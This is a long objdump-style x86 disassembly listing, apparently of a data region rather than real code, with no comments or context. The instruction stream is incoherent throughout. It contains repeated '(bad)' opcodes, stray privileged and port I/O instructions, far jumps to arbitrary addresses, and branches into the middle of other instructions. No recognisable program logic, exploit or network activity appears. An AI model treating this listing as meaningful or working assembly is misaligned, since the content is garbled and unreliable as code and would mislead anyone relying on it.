  409a9b:	push   0x4da8ec2f
  409aa0:	inc    ecx
  409aa1:	inc    esp
  409aa2:	inc    eax
  409aa3:	jno    0x409a78
  409aa5:	jmp    0xa564a461
  409aaa:	mov    dl,0x95
  409aac:	cli    
  409aad:	dec    esi
  409aae:	jno    0x409ac5
  409ab0:	xchg   edi,eax
  409ab1:	mov    eax,0x3cd895eb
  409ab6:	jp     0x409b09
  409ab8:	arpl   WORD PTR [ebx-0x35f1b5f5],cx
  409abe:	push   edx
  409abf:	xchg   ecx,eax
  409ac0:	jmp    0x409a93
  409ac2:	pop    ebx
  409ac3:	cli    
  409ac4:	sbb    DWORD PTR [ebx-0x603edb3c],0x1f
  409acb:	cmc    
  409acc:	mov    ?,WORD PTR [ebp-0x43]
  409acf:	aad    0x6f
  409ad1:	adc    DWORD PTR [ebx-0xa],0xffffff88
  409ad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ad6:	mov    al,0x15
  409ad8:	fwait
  409ad9:	inc    esi
  409ada:	mov    cl,0x5c
  409adc:	dec    esp
  409add:	(bad)  
  409ade:	cld    
  409adf:	daa    
  409ae0:	add    ebx,esp
  409ae2:	mov    eax,gs:0x19bd82dd
  409ae8:	aaa    
  409ae9:	lahf   
  409aea:	lock jecxz 0x409a92
  409aed:	pop    es
  409aee:	cmp    esi,ebx
  409af0:	jge    0x409abc
  409af2:	mov    ds:0x7626c851,al
  409af7:	or     al,BYTE PTR [edi+eax*2+0x2b6702ab]
  409afe:	jle    0x409b15
  409b00:	push   ebp
  409b01:	add    eax,0xf6d3e021
  409b06:	psubw  mm7,QWORD PTR [ebp+0x10]
  409b0a:	cli    
  409b0b:	lods   eax,DWORD PTR ds:[esi]
  409b0c:	xchg   ebp,eax
  409b0d:	jbe    0x409a95
  409b0f:	xor    DWORD PTR [eax-0x35],eax
  409b12:	dec    ebx
  409b13:	adc    ebx,DWORD PTR [edi]
  409b15:	pop    es
  409b16:	or     esp,DWORD PTR [edi-0xef54616]
  409b1c:	jecxz  0x409b7d
  409b1e:	adc    al,0xc3
  409b20:	cdq    
  409b21:	lea    esp,[eax+esi*1+0x5e]
  409b25:	test   al,0x17
  409b27:	test   BYTE PTR [ebp+0x3c26b558],0xc
  409b2e:	push   edx
  409b2f:	push   0xffffff83
  409b31:	cdq    
  409b32:	jge    0x9a579e1f
  409b38:	iret   
  409b39:	fcom   DWORD PTR [edx-0x31]
  409b3c:	fwait
  409b3d:	pop    ss
  409b3e:	out    0x29,al
  409b40:	push   cs
  409b41:	sahf   
  409b42:	pop    ebx
  409b43:	mov    ah,al
  409b45:	pushw  ss
  409b47:	adc    DWORD PTR [edx+0x5c79bb79],edi
  409b4d:	(bad)  
  409b4e:	pop    eax
  409b4f:	sar    BYTE PTR [esi],0x6
  409b52:	fcom   QWORD PTR [ecx-0x5181232b]
  409b58:	sub    BYTE PTR [edx],bh
  409b5a:	gs jo  0x409b5a
  409b5d:	mov    edi,0x15d21f48
  409b62:	rcr    bh,0x6f
  409b65:	jmp    0x409b4d
  409b67:	xor    BYTE PTR [eax],al
  409b69:	sahf   
  409b6a:	test   eax,0xf4ee7266
  409b6f:	add    esp,DWORD PTR [ebx-0x3d]
  409b72:	mov    BYTE PTR [edi-0x61],bl
  409b75:	es popf 
  409b77:	xchg   ebx,eax
  409b78:	lock in al,dx
  409b7a:	fldcw  WORD PTR [eax+edi*8+0xffb4c1]
  409b81:	cmp    eax,0xa719af90
  409b86:	lods   eax,DWORD PTR ds:[esi]
  409b87:	scas   eax,DWORD PTR es:[edi]
  409b88:	push   ebp
  409b89:	sar    BYTE PTR [edi-0x45],0x8f
  409b8d:	pop    edx
  409b8e:	(bad)
  409b92:	inc    edx
  409b93:	jp     0x409be1
  409b95:	aad    0xa6
  409b97:	jb     0x409b32
  409b99:	adc    ecx,DWORD PTR [ebp+edi*8+0x21]
  409b9d:	mov    esi,ebx
  409b9f:	ins    BYTE PTR es:[edi],dx
  409ba0:	xor    BYTE PTR [eax+0x39],ah
  409ba3:	and    al,0x45
  409ba5:	xor    eax,0x8d7c6e81
  409baa:	or     eax,0x37b5a09b
  409baf:	in     al,0x86
  409bb1:	sbb    eax,0x49e2b799
  409bb6:	jno    0x409b8d
  409bb8:	imul   ebx
  409bba:	push   ds
  409bbb:	push   edx
  409bbc:	push   0x87399b0d
  409bc1:	mov    al,ds:0x38b7352f
  409bc6:	jmp    0x409b72
  409bc8:	mov    al,0xe6
  409bca:	ret    
  409bcb:	xor    DWORD PTR [edx+0x37],edx
  409bce:	add    al,0xa3
  409bd0:	and    al,0xf
  409bd2:	retf   0xb877
  409bd5:	div    DWORD PTR [edx+0x423719b6]
  409bdb:	iret   
  409bdc:	and    ebx,ebp
  409bde:	mov    edi,cs
  409be0:	push   es
  409be1:	add    esi,edx
  409be3:	or     esp,DWORD PTR [esi]
  409be5:	int3   
  409be6:	dec    esp
  409be7:	pop    edx
  409be8:	jns    0x409ba1
  409bea:	popf   
  409beb:	rcr    BYTE PTR [di+0x52],cl
  409bef:	xchg   ebx,eax
  409bf0:	or     eax,0x4c64572c
  409bf5:	std    
  409bf6:	adc    al,0x23
  409bf8:	pop    ebx
  409bf9:	xor    eax,0x50f547a2
  409bfe:	jbe    0x409bb9
  409c00:	out    dx,al
  409c01:	cdq    
  409c02:	in     eax,0xcf
  409c04:	mov    dh,0x88
  409c06:	xor    dl,BYTE PTR [ecx]
  409c08:	fldln2 
  409c0a:	jne    0x409c76
  409c0c:	mov    ecx,0x267ed3df
  409c11:	test   BYTE PTR [ecx],0x56
  409c14:	jmp    0x97a7:0xab2d8739
  409c1b:	stc    
  409c1c:	add    eax,0x9f934e
  409c21:	xor    al,0x32
  409c23:	xor    esi,DWORD PTR [esi]
  409c25:	cdq    
  409c26:	xchg   BYTE PTR [esi],ah
  409c28:	and    eax,0xf0ad9707
  409c2d:	int    0x9
  409c2f:	lock out 0x34,eax
  409c32:	test   eax,0x40eb9540
  409c37:	cs mov ch,0x26
  409c3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c3b:	jge    0x409c5b
  409c3d:	inc    esp
  409c3e:	pop    edi
  409c3f:	(bad)  
  409c40:	loop   0x409ca6
  409c42:	out    dx,eax
  409c43:	hlt    
  409c44:	sub    BYTE PTR [ebp-0x706474a9],dl
  409c4a:	enter  0xb0e9,0xdb
  409c4e:	ficomp DWORD PTR [esp+eax*1]
  409c51:	in     eax,dx
  409c52:	push   edx
  409c53:	cmp    eax,0x1e15ea14
  409c58:	ins    BYTE PTR es:[edi],dx
  409c59:	retf   0x988b
  409c5c:	dec    edi
  409c5d:	mov    ebx,0x5acad2e6
  409c62:	out    dx,eax
  409c63:	shr    DWORD PTR [edi-0x46065857],1
  409c69:	add    al,0x1b
  409c6b:	inc    esi
  409c6c:	ss dec esi
  409c6e:	cmp    eax,0xaae02deb
  409c73:	xor    bl,BYTE PTR [edi]
  409c75:	cmp    BYTE PTR [edi],0x94
  409c78:	cwde   
  409c79:	add    dh,dl
  409c7b:	bound  esi,QWORD PTR [esi-0x72]
  409c7e:	or     edx,eax
  409c80:	lea    esp,[eax+0x540b60fc]
  409c86:	push   ebp
  409c87:	push   ebp
  409c88:	ins    BYTE PTR es:[edi],dx
  409c89:	out    0xad,eax
  409c8b:	add    BYTE PTR [edx],dh
  409c8d:	dec    ebp
  409c8e:	sbb    eax,0x7551713b
  409c93:	mov    ebx,0x40172ad4
  409c98:	in     al,dx
  409c99:	arpl   WORD PTR [ebp+0x3c],si
  409c9c:	xor    DWORD PTR [edi-0x21797eb8],eax
  409ca2:	inc    ecx
  409ca3:	add    eax,0xc85b9003
  409ca8:	xchg   esi,eax
  409ca9:	in     al,0x1d
  409cab:	pop    ecx
  409cac:	jne    0x409cd1
  409cae:	mov    eax,fs
  409cb0:	repz push 0xa8345f9d
  409cb6:	xor    DWORD PTR [ebx],edi
  409cb8:	rcr    DWORD PTR [edx],cl
  409cba:	inc    eax
  409cbb:	add    bh,dh
  409cbd:	or     bh,ch
  409cbf:	push   ebx
  409cc0:	adc    DWORD PTR [edx-0x37],ebx
  409cc3:	jle    0x409ca0
  409cc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cc6:	sbb    esp,0xfffffffe
  409cc9:	xchg   ah,dh
  409ccb:	mov    cl,0x40
  409ccd:	or     ebx,DWORD PTR [ecx-0x5ec9bbe]
  409cd3:	jne    0x409c70
  409cd5:	add    BYTE PTR [edi-0x5d],cl
  409cd8:	xchg   ebx,eax
  409cd9:	and    BYTE PTR [edi+0x40],0xcd
  409cdd:	push   DWORD PTR [edx-0x393cd892]
  409ce3:	pusha  
  409ce4:	cwde   
  409ce5:	xor    BYTE PTR [ebx+eiz*2+0x3],dl
  409ce9:	dec    esi
  409cea:	mov    esp,DWORD PTR [esi+0x34]
  409ced:	stos   DWORD PTR es:[edi],eax
  409cee:	(bad)  
  409cef:	pop    ebx
  409cf0:	pop    ds
  409cf1:	shl    BYTE PTR [edx+0xd],1
  409cf4:	out    dx,al
  409cf5:	loope  0x409ca6
  409cf7:	mov    ecx,0x49796215
  409cfc:	dec    ebx
  409cfd:	mov    eax,0xd2309892
  409d02:	fs cdq 
  409d04:	cmp    BYTE PTR [eax+0x2caa1682],bl
  409d0a:	sar    BYTE PTR ds:0xc961219e,cl
  409d10:	aam    0xcc
  409d12:	into   
  409d13:	scas   eax,DWORD PTR es:[edi]
  409d14:	mov    ebx,ds
  409d16:	sbb    ah,dh
  409d18:	pop    ds
  409d19:	cwde   
  409d1a:	jle    0x409cb2
  409d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d1d:	int3   
  409d1e:	pop    esp
  409d1f:	mov    esi,DWORD PTR [esi+0x2240d226]
  409d25:	in     al,dx
  409d26:	mov    bl,0x4c
  409d28:	add    eax,0x820dcdd2
  409d2d:	push   ds
  409d2e:	out    dx,al
  409d2f:	std    
  409d30:	and    edi,edi
  409d32:	adc    DWORD PTR [eax+0x10274615],esp
  409d38:	push   ebx
  409d39:	sbb    DWORD PTR [edi],ecx
  409d3b:	lods   eax,DWORD PTR ds:[esi]
  409d3c:	cmp    eax,0x470239ab
  409d41:	add    al,0x51
  409d43:	mov    esp,DWORD PTR [edx-0x3e2edc14]
  409d49:	out    dx,al
  409d4a:	or     esi,DWORD PTR [ecx]
  409d4c:	(bad)  
  409d4d:	push   esp
  409d4e:	sub    DWORD PTR [edx+0x61],ebx
  409d51:	(bad)  
  409d52:	pop    edx
  409d53:	into   
  409d54:	and    ah,BYTE PTR [eax-0xf26bdf0]
  409d5a:	iret   
  409d5b:	(bad)  
  409d5d:	mov    ch,0x3f
  409d5f:	cs ss mov edi,0x2858fda0
  409d66:	loope  0x409d28
  409d68:	addr16 es xchg esp,eax
  409d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d6c:	hlt    
  409d6d:	loope  0x409d82
  409d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d70:	sub    ebp,edx
  409d72:	cli    
  409d73:	rol    BYTE PTR [esi],1
  409d75:	sahf   
  409d76:	jmp    0x409d05
  409d78:	out    dx,eax
  409d79:	and    eax,0xdc81ab98
  409d7e:	outs   dx,BYTE PTR ds:[esi]
  409d7f:	(bad)  
  409d80:	mov    edi,0x8c1cf006
  409d85:	repz add DWORD PTR [edi+0x649144ff],esp
  409d8c:	mov    ch,0xf5
  409d8e:	fmulp  st(7),st
  409d90:	cmc    
  409d91:	sub    DWORD PTR [edi],edi
  409d93:	sub    al,0x14
  409d95:	mov    ebx,0x4ee031f5
  409d9a:	xchg   edi,eax
  409d9b:	dec    esi
  409d9c:	inc    ecx
  409d9d:	test   al,0x5d
  409d9f:	mov    dl,0xec
  409da1:	pop    edx
  409da2:	jbe    0x409d56
  409da4:	jbe    0x409d9c
  409da6:	push   ss
  409da7:	call   0x45fe:0x9fcda90
  409dae:	outs   dx,DWORD PTR ds:[esi]
  409daf:	dec    esi
  409db0:	push   edx
  409db1:	test   DWORD PTR [esi+0x5c],0x54e43be
  409db8:	pop    ecx
  409db9:	push   esi
  409dba:	jno    0x409d4c
  409dbc:	(bad)  
  409dbd:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  409dbf:	xchg   ebp,eax
  409dc0:	mov    ah,0xe4
  409dc2:	stos   DWORD PTR es:[edi],eax
  409dc3:	xchg   DWORD PTR ss:[eax+0x754e7d45],ecx
  409dca:	retf   
  409dcb:	or     DWORD PTR [eax],ebx
  409dcd:	and    ebp,edi
  409dcf:	(bad)  
  409dd0:	jae    0x409e25
  409dd2:	retf   0xbac0
  409dd5:	call   0xdc405ece
  409dda:	and    eax,0xde43bce9
  409ddf:	aad    0xe7
  409de1:	sub    al,0x5
  409de3:	mov    ch,0x4
  409de5:	adc    ebx,DWORD PTR [edx-0x5b]
  409de8:	pop    ebx
  409de9:	inc    esp
  409dea:	add    eax,0xe7a418b5
  409def:	pop    edi
  409df0:	dec    ebx
  409df1:	lds    ebp,FWORD PTR [ecx-0x6cd48c05]
  409df7:	imul   BYTE PTR [edi]
  409df9:	repz fbstp TBYTE PTR [ebp+0x4c]
  409dfd:	in     al,0xd5
  409dff:	jmp    0x409e76
  409e01:	sbb    DWORD PTR [edx],eax
  409e03:	add    al,0x73
  409e05:	push   edx
  409e06:	add    DWORD PTR [edi+0x1d],0x26
  409e0a:	sbb    DWORD PTR [ebp-0xb2868e],0xa590ae41
  409e14:	in     al,0x67
  409e16:	in     eax,0xe0
  409e18:	iret   
  409e19:	in     eax,0xce
  409e1b:	mov    esp,0x5e88f6e6
  409e20:	add    al,0xe5
  409e22:	jns    0x409e85
  409e24:	sar    ebp,cl
  409e26:	stos   DWORD PTR es:[edi],eax
  409e27:	(bad)  
  409e28:	jl     0x409dcf
  409e2a:	out    0x1b,al
  409e2c:	fwait
  409e2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e2e:	aaa    
  409e2f:	xor    esp,ecx
  409e31:	adc    ebp,DWORD PTR [edx]
  409e33:	outs   dx,DWORD PTR ds:[esi]
  409e34:	xchg   edx,eax
  409e35:	loopne 0x409e3a
  409e37:	(bad)  
  409e38:	mov    al,BYTE PTR [ebx+esi*8-0x30]
  409e3c:	cmc    
  409e3d:	inc    ebx
  409e3e:	aad    0xf
  409e40:	xor    esp,DWORD PTR [ebx-0x45]
  409e43:	xchg   esi,eax
  409e44:	dec    ecx
  409e45:	mov    ds:0xa13296c9,al
  409e4a:	jge    0x409dd3
  409e4c:	stos   BYTE PTR es:[edi],al
  409e4d:	cmp    al,0x3a
  409e4f:	stos   DWORD PTR es:[edi],eax
  409e50:	repnz les edx,FWORD PTR ss:[ebx+0x54]
  409e55:	and    BYTE PTR [edx],dh
  409e57:	pop    ss
  409e58:	dec    ecx
  409e59:	cwde   
  409e5a:	or     edx,DWORD PTR [ecx]
  409e5c:	mov    esi,0x7c137e1c
  409e61:	mov    edx,0x8c648a3
  409e66:	icebp  
  409e67:	daa    
  409e68:	data16 (bad) 
  409e6a:	jns    0x409edf
  409e6c:	or     al,0x66
  409e6e:	outs   dx,DWORD PTR ds:[esi]
  409e6f:	fmulp  st(3),st
  409e71:	mov    bh,0x3
  409e73:	rol    esi,1
  409e75:	push   0x9f85d4c2
  409e7a:	leave  
  409e7b:	dec    ecx
  409e7c:	and    ebp,edx
  409e7e:	mov    dh,BYTE PTR [edi+0x492d8fbc]
  409e84:	into   
  409e85:	gs das 
  409e87:	retf   
  409e88:	xchg   ebx,eax
  409e89:	cmp    edi,esi
  409e8b:	sub    BYTE PTR [ecx-0x6b292d50],al
  409e91:	sub    al,0xd7
  409e93:	dec    ebx
  409e94:	in     eax,dx
  409e95:	jo     0x409e50
  409e97:	(bad)  [ebx]
  409e99:	outs   dx,BYTE PTR ds:[esi]
  409e9a:	icebp  
  409e9b:	fwait
  409e9c:	xlat   BYTE PTR ds:[ebx]
  409e9d:	mov    al,0xd3
  409e9f:	cmp    BYTE PTR cs:[edi+0x361816ca],ah
  409ea6:	pop    edx
  409ea7:	cmp    ebp,ecx
  409ea9:	sub    al,BYTE PTR [eax+0x39209ae0]
  409eaf:	in     al,0x23
  409eb1:	mov    ds:0x32fd45b7,al
  409eb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409eb7:	mov    WORD PTR [esi],bp
  409eba:	test   eax,0x983542f2
  409ebf:	data16 into 
  409ec1:	jge    0x409ecd
  409ec3:	lods   al,BYTE PTR ds:[esi]
  409ec4:	retf   0xfe18
  409ec7:	push   ebp
  409ec8:	adc    ecx,DWORD PTR [eax+ecx*1+0x1cbb14f4]
  409ecf:	jmp    0x409f14
  409ed1:	stos   BYTE PTR es:[edi],al
  409ed2:	loope  0x409f3a
  409ed4:	aas    
  409ed5:	aaa    
  409ed6:	or     ebp,esp
  409ed8:	repnz or edi,0x5134f6f2
  409edf:	inc    ecx
  409ee0:	cs xchg ecx,eax
  409ee2:	jp     0x409f1c
  409ee4:	mov    dh,0x46
  409ee6:	fild   WORD PTR [ebx+0x58]
  409ee9:	sbb    DWORD PTR [edx+0x33],edx
  409eec:	retf   0xbbd5
  409eef:	ret    
  409ef0:	jo     0x409f4e
  409ef2:	repnz dec ebp
  409ef4:	mov    al,ds:0x6eba5dcd
  409ef9:	in     al,0x73
  409efb:	add    BYTE PTR ds:0xaf744e1d,ch
  409f01:	xchg   ecx,ebx
  409f03:	push   edi
  409f04:	lea    edx,[ebx+eax*4]
  409f07:	push   0xcd060904
  409f0c:	add    esp,eax
  409f0e:	imul   ebx,DWORD PTR [ebx+0x5d],0x47b915c2
  409f15:	arpl   WORD PTR [edx],sp
  409f17:	jo     0x409ef1
  409f19:	stos   DWORD PTR es:[edi],eax
  409f1a:	and    ecx,DWORD PTR [esi+0xd4128b9]
  409f20:	stc    
  409f21:	stos   DWORD PTR es:[edi],eax
  409f22:	aaa    
  409f23:	bound  esp,QWORD PTR [ecx+0x45f0fe9b]
  409f29:	jae    0x409f82
  409f2b:	push   edx
  409f2c:	ds popf 
  409f2e:	std    
  409f2f:	aas    
  409f30:	mov    edi,0x8f86f579
  409f35:	shl    BYTE PTR [ebp+0x72],0x6e
  409f39:	jle    0x409f1a
  409f3b:	mov    dh,0x4c
  409f3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f3e:	pop    ds
  409f3f:	mov    eax,ds:0xc3476982
  409f44:	ror    DWORD PTR [ebx-0x22e4cc16],1
  409f4a:	mov    esi,0xb24e2428
  409f4f:	ja     0x409edd
  409f51:	fild   QWORD PTR [edx-0x74277dc]
  409f57:	lods   eax,DWORD PTR ds:[esi]
  409f58:	mov    cl,0x34
  409f5a:	mov    eax,0xc9f8d6a0
  409f5f:	lods   al,BYTE PTR ds:[esi]
  409f60:	and    ebp,eax
  409f62:	mov    edi,0x9b6ffbcc
  409f67:	add    BYTE PTR [edx],dh
  409f69:	mov    edx,0x736d4d01
  409f6e:	jle    0x409fbb
  409f70:	add    eax,0x3d731f83
  409f75:	cs jae 0x409fee
  409f78:	es inc edi
  409f7a:	(bad)  
  409f7b:	and    esp,DWORD PTR [ebp-0x481f69f9]
  409f81:	push   eax
  409f82:	pop    ecx
  409f83:	inc    ebp
  409f84:	sbb    al,0xbc
  409f86:	jmp    0x8787:0x81cd4132
  409f8d:	pushf  
  409f8e:	std    
  409f8f:	fstp   TBYTE PTR ds:0x30f3d832
  409f95:	fstp   TBYTE PTR [eax+0x410d0b23]
  409f9b:	push   ebx
  409f9c:	clc    
  409f9d:	xor    esp,DWORD PTR [esi-0x78ff9fa]
  409fa3:	or     eax,0x148de214
  409fa8:	gs dec edx
  409faa:	lods   al,BYTE PTR ds:[esi]
  409fab:	pop    ecx
  409fac:	iret   
  409fad:	(bad)  
  409fae:	xchg   ebx,eax
  409faf:	mov    ebp,0x6c88060a
  409fb4:	(bad)  
  409fb5:	jl     0x409f7b
  409fb7:	in     ax,dx
  409fb9:	fwait
  409fba:	repz ret 0x32ed
  409fbe:	dec    ecx
  409fbf:	push   eax
  409fc0:	jnp    0x40a010
  409fc2:	pop    ds
  409fc3:	dec    ecx
  409fc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fc5:	or     ebx,esp
  409fc7:	jnp    0x409fda
  409fc9:	or     bl,BYTE PTR [edx]
  409fcb:	sti    
  409fcc:	jl     0x409fa3
  409fce:	sbb    BYTE PTR [eax],bh
  409fd0:	adc    esi,DWORD PTR [edx+0xb248883]
  409fd6:	je     0x409ff4
  409fd8:	jl     0x40a042
  409fda:	ja     0x409f99
  409fdc:	inc    ecx
  409fdd:	and    BYTE PTR [edx-0x73],dl
  409fe0:	retf   
  409fe1:	fstp   QWORD PTR [ecx+0x23]
  409fe4:	sbb    eax,0x3749fa06
  409fe9:	ss retf 0x1f5b
  409fed:	in     al,dx
  409fee:	xchg   esi,eax
  409fef:	jge    0x409f9f
  409ff1:	test   DWORD PTR [ebx-0xd],ecx
  409ff4:	add    eax,0x1083ab42
  409ff9:	loop   0x40a01c
  409ffb:	out    dx,eax
  409ffc:	ret    
  409ffd:	clc    
  409ffe:	add    eax,edx
  40a000:	dec    esi
  40a001:	sub    cl,dl
  40a003:	xrelease mov BYTE PTR ds:0x50703b96,ch
  40a00a:	cmp    bl,BYTE PTR [ebp-0x479b95ab]
  40a010:	sub    al,0x8e
  40a012:	or     ecx,DWORD PTR [edx+0x63]
  40a015:	mov    BYTE PTR ss:[edx],cl
  40a018:	xor    al,0x6c
  40a01a:	call   0xd539:0x5f4455db
  40a021:	sbb    DWORD PTR [edx],ebx
  40a023:	fist   WORD PTR [edi+0x49]
  40a026:	mov    ebx,0xac705658
  40a02b:	adc    esp,eax
  40a02d:	xchg   BYTE PTR [ebx+0x3a],bl
  40a030:	mov    cl,0xa1
  40a032:	fcmovnu st,st(1)
  40a034:	mov    edi,0x65958f33
  40a039:	ds adc eax,0x2c99349
  40a03f:	and    al,0xe8
  40a041:	mov    DWORD PTR [edi],edx
  40a043:	cdq    
  40a044:	sub    DWORD PTR [ebp-0x3c],esi
  40a047:	mov    eax,ds:0x83213408
  40a04c:	loope  0x40a06b
  40a04e:	add    edi,DWORD PTR [eax-0x192b1039]
  40a054:	inc    edx
  40a055:	ror    dl,cl
  40a057:	push   esi
  40a058:	addr16 mov ecx,ecx
  40a05b:	aas    
  40a05c:	cmp    ebp,DWORD PTR [edx]
  40a05e:	inc    esi
  40a05f:	or     eax,0x668f9e10
  40a064:	test   al,0x7e
  40a066:	jae    0x40a070
  40a068:	cli    
  40a069:	loope  0x40a08d
  40a06b:	inc    ebx
  40a06c:	jns    0x40a058
  40a06e:	stos   DWORD PTR es:[edi],eax
  40a06f:	mov    ?,WORD PTR [ecx+0x1cbf33fc]
  40a075:	push   ss
  40a076:	mov    WORD PTR [ebp+0x11e61d1c],ds
  40a07c:	jge    0x40a0a1
  40a07e:	inc    ebp
  40a07f:	pusha  
  40a080:	push   edi
  40a081:	adc    DWORD PTR cs:[edi+edi*1+0x7f],0xce6f5523
  40a08a:	push   ebx
  40a08b:	test   al,0x2f
  40a08d:	inc    edx
  40a08e:	xchg   esi,eax
  40a08f:	scas   eax,DWORD PTR es:[edi]
  40a090:	bound  ecx,QWORD PTR [edx+0x615f839c]
  40a096:	ds in  al,dx
  40a098:	in     al,dx
  40a099:	daa    
  40a09a:	sub    ecx,DWORD PTR [edx+0x6]
  40a09d:	test   eax,0x90d0322f
  40a0a2:	adc    DWORD PTR [edx-0x68],esi
  40a0a5:	outs   dx,BYTE PTR ds:[esi]
  40a0a6:	jmp    0x3d7d:0x8468d951
  40a0ad:	mov    al,0x41
  40a0af:	rcl    BYTE PTR [ebp+0x1],1
  40a0b2:	nop
  40a0b3:	js     0x40a0f2
  40a0b5:	loopne 0x40a0a2
  40a0b7:	add    al,0x64
  40a0b9:	cmp    al,BYTE PTR [ebx]
  40a0bb:	xchg   esp,eax
  40a0bc:	dec    edx
  40a0bd:	test   eax,0x23b4a4c
  40a0c2:	out    dx,eax
  40a0c3:	fnstcw WORD PTR [edi+0x4b]
  40a0c6:	sar    BYTE PTR [edx],cl
  40a0c8:	adc    ebx,DWORD PTR [ecx+0x6df53a4d]
  40a0ce:	and    BYTE PTR ds:0xb945b213,dh
  40a0d4:	stos   DWORD PTR es:[edi],eax
  40a0d5:	xchg   esi,eax
  40a0d6:	push   edx
  40a0d7:	out    dx,eax
  40a0d8:	push   ebx
  40a0d9:	mov    DWORD PTR [esi+0x50321456],0xcd54fc77
  40a0e3:	dec    edi
  40a0e4:	and    DWORD PTR [ecx-0x7],0xea725029
  40a0eb:	fcmovnu st,st(5)
  40a0ed:	inc    ecx
  40a0ee:	jno    0x40a123
  40a0f0:	and    al,0x7c
  40a0f2:	bound  ebp,QWORD PTR [ebx+0x76e18681]
  40a0f8:	add    eax,0x93bb2721
  40a0fd:	jns    0x40a156
  40a0ff:	jbe    0x40a140
  40a101:	cs addr16 mov ebx,0x389871bc
  40a108:	cwde   
  40a109:	(bad)  
  40a10a:	daa    
  40a10b:	push   ebx
  40a10c:	mov    dl,0x7c
  40a10e:	loop   0x40a0be
  40a110:	xor    ebx,eax
  40a112:	fild   QWORD PTR [edi]
  40a114:	mov    WORD PTR [ebx+esi*1+0x54],gs
  40a118:	cwde   
  40a119:	xchg   DWORD PTR [ebx-0x33],edi
  40a11c:	icebp  
  40a11d:	xchg   edi,eax
  40a11e:	es jo  0x40a153
  40a121:	adc    BYTE PTR [ebx],cl
  40a123:	mov    ch,0xd7
  40a125:	les    ebx,FWORD PTR [ebp-0x1500d3e5]
  40a12b:	jl     0x40a120
  40a12d:	shr    BYTE PTR ds:0x4a6abeb3,0x53
  40a134:	(bad)  
  40a136:	mov    es,WORD PTR [edx+0x685a034a]
  40a13c:	scas   al,BYTE PTR es:[edi]
  40a13d:	add    eax,0x2d6dd54f
  40a142:	test   eax,0x6aefc6e1
  40a147:	fwait
  40a148:	xchg   ecx,eax
  40a149:	stos   DWORD PTR es:[edi],eax
  40a14a:	xchg   esp,eax
  40a14b:	(bad)  
  40a14d:	mov    bh,0x96
  40a14f:	icebp  
  40a150:	pop    esp
  40a151:	xchg   edx,eax
  40a152:	retf   0x7c4f
  40a155:	sti    
  40a156:	fnsave [eax+esi*2]
  40a159:	stos   BYTE PTR es:[edi],al
  40a15a:	add    al,0x75
  40a15c:	or     cl,al
  40a15e:	js     0x40a1b9
  40a160:	cs push ecx
  40a162:	into   
  40a163:	sub    DWORD PTR [eax+0x1d],edx
  40a166:	(bad)  
  40a167:	es loop 0x40a0f2
  40a16a:	jns    0x40a198
  40a16c:	sbb    esp,DWORD PTR [edi+ecx*4+0x659a015b]
  40a173:	or     ah,BYTE PTR [eax-0x3af3ca66]
  40a179:	push   es
  40a17a:	ins    BYTE PTR es:[edi],dx
  40a17b:	shr    BYTE PTR [esi+edi*2-0x25fc838c],0xe7
  40a183:	jecxz  0x40a1d7
  40a185:	add    DWORD PTR [edx+esi*4-0x673ebc59],edx
  40a18c:	jmp    0xd6e68af1
  40a191:	xor    al,0xe4
  40a193:	das    
  40a194:	inc    esi
  40a195:	iret   
  40a196:	lahf   
  40a197:	ins    BYTE PTR es:[edi],dx
  40a198:	jbe    0x40a1ab
  40a19a:	cmp    ch,ch
  40a19c:	inc    ebp
  40a19d:	sbb    al,0x8e
  40a19f:	xor    eax,0xa7212699
  40a1a4:	xor    eax,0x3fa9bc77
  40a1a9:	(bad)  
  40a1aa:	aas    
  40a1ab:	xchg   DWORD PTR [edi+0x5a11f6c5],edi
  40a1b1:	jecxz  0x40a145
  40a1b3:	int    0xba
  40a1b5:	push   0xf244cdd8
  40a1ba:	pop    esi
  40a1bb:	adc    eax,0x9db57577
  40a1c0:	ret    0x3b99
  40a1c3:	(bad)  
  40a1c4:	fiadd  WORD PTR [ebp+0x685cd496]
  40a1ca:	jmp    0x110f:0x55a112f6
  40a1d1:	shl    DWORD PTR [edx+0x75],cl
  40a1d4:	addr16 pop es
  40a1d6:	adc    DWORD PTR [ebx-0x72],eax
  40a1d9:	and    BYTE PTR [edi+0x3a],ah
  40a1dc:	addr16 loope 0x40a164
  40a1df:	mov    eax,ds:0xfb6548ef
  40a1e4:	cmp    dl,bl
  40a1e6:	enter  0x76c2,0x81
  40a1ea:	in     al,0xcc
  40a1ec:	inc    esi
  40a1ed:	ss das 
  40a1ef:	js     0x40a26a
  40a1f1:	int3   
  40a1f2:	and    al,0x76
  40a1f4:	fdivp  st(2),st
  40a1f6:	mov    DWORD PTR [ebx+0x6f],0x828e6b35
  40a1fd:	ja     0x40a22f
  40a1ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a200:	ret    0xf4a2
  40a203:	(bad)  
  40a204:	clc    
  40a205:	pop    ecx
  40a206:	aaa    
  40a207:	call   DWORD PTR [edi-0x28f1275b]
  40a20d:	xchg   BYTE PTR [eax],dl
  40a20f:	mov    ?,WORD PTR [esi]
  40a211:	xor    BYTE PTR [edi-0x7c87d7b1],dh
  40a217:	fmul   QWORD PTR [edx]
  40a219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a21a:	and    DWORD PTR [esi-0x56a077d1],eax
  40a220:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a221:	jle    0x40a235
  40a223:	repz aaa 
  40a225:	stos   DWORD PTR es:[edi],eax
  40a226:	mov    eax,ds:0x2ff61d6c
  40a22b:	and    BYTE PTR [eax+0x3f],0xc3
  40a22f:	add    BYTE PTR [ebx+edi*2+0x30],ch
  40a233:	pop    eax
  40a234:	inc    edx
  40a235:	cmp    eax,0xab98e174
  40a23a:	leave  
  40a23b:	push   ss
  40a23c:	mov    esp,ecx
